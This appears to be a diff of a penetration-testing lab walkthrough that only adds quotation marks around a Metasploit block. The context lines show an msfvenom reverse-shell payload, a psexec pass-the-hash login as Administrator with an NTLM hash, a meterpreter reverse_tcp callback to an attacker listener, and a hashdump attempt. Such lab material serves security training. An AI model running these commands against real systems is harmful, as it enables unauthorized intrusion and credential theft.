@@ -25,7 +25,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.168.110 lport=7477 -f 
 12. With SMB open, what can we use to get onto M1?  The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for. #It was written by sysinternals and has been integrated within the framework.<BR>
 <BR>
 13.Within msfconsole:<BR>
-use exploit/windows/smb/psexec<BR>
+'use exploit/windows/smb/psexec<BR>
 set rhost 192.168.168.101<BR>
 set SMBUser Administrator<BR>
 set SMBPass aad3b435b51404eeaad3b435b51404ee:e7bf67913f1f54abf11af55aee36b9e9<BR>
@@ -33,7 +33,7 @@ show options<BR>
 set payload windows/meterpreter/reverse_tcp<BR>
 set lhost 192.168.168.110<BR>
 set lport 7479<BR>
-exploit<BR>
+exploit<BR>'
 <BR>
 meterpreter > hashdump<BR>
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.<BR>
